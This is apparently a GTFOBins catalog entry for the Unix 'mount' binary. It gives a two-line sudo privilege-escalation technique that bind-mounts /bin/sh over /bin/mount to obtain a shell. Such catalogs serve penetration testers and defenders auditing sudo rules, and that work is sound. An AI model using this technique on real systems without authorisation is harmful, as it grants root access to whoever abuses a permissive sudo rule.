<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/mount -->
---
functions:
  privilege-escalation:
  - code: |-
      mount -o bind /bin/sh /bin/mount
      mount
    comment: |-
      This overrides `mount` itself with a shell (or any other executable).
    contexts:
      sudo:
...
